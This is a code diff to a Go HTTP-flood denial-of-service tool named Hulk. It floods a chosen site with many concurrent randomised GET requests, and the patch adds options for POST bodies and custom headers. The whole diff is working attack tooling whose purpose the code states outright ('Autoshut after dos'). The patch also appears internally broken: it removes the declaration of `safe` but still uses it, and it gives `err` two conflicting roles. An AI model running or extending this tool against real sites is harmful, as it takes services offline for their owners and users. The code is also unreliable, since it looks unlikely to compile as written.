@@ -23,11 +23,13 @@ import (
 	"syscall"
 )
 
+const __version__  = "1.0.0"
+
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk uint8 = iota
+	callGotOk              uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -61,27 +63,49 @@ var (
 	cur int32
 )
 
+type arrayFlags []string
+
+func (i *arrayFlags) String() string {
+	return "[" + strings.Join(*i, ",") + "]"
+}
+
+func (i *arrayFlags) Set(value string) error {
+	*i = append(*i, value)
+	return nil
+}
+
 func main() {
 	var (
-		safe         bool
-		site, agents string
+		version bool
+		site    string
+		agents  string
+		data    string
+		headers arrayFlags
 	)
 
+	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
+	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.Var(&headers, "headers", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
 	t := os.Getenv("HULKMAXPROCS")
-	maxproc, e := strconv.Atoi(t)
-	if e != nil {
+	maxproc, err := strconv.Atoi(t)
+	if err != nil {
 		maxproc = 1023
 	}
 
-	u, e := url.Parse(site)
-	if e != nil {
-		fmt.Println("error parsing url parameter\n")
+	u, err := url.Parse(site)
+	if err != nil {
+		fmt.Println("err parsing url parameter\n")
 		os.Exit(1)
+	}
+
+	if version {
+		fmt.Println("Hulk", __version__)
+		os.Exit(0)
 	}
 
 	if agents != "" {
@@ -108,7 +132,7 @@ func main() {
 		fmt.Println("In use               |\tResp OK |\tGot err")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-				go httpcall(site, u.Host, ss)
+				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
 				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
@@ -137,7 +161,7 @@ func main() {
 	fmt.Println("\r\n-- Interrupted by user --        \n")
 }
 
-func httpcall(url string, host string, s chan uint8) {
+func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
 	atomic.AddInt32(&cur, 1)
 
 	var param_joiner string
@@ -150,11 +174,20 @@ func httpcall(url string, host string, s chan uint8) {
 	}
 
 	for {
-		q, e := http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-		if e != nil {
+		var q *http.Request
+		var err error
+
+		if data == "" {
+			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+		} else {
+			q, err = http.NewRequest("POST", url, strings.NewReader(data))
+		}
+
+		if err != nil {
 			s <- callExitOnErr
 			return
 		}
+
 		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
@@ -162,6 +195,14 @@ func httpcall(url string, host string, s chan uint8) {
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
+
+		// Overwrite headers with parameters
+
+		for _, element := range headers {
+			words := strings.Split(element, ":")
+			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
+		}
+
 		r, e := client.Do(q)
 		if e != nil {
 			fmt.Fprintln(os.Stderr, e.Error())
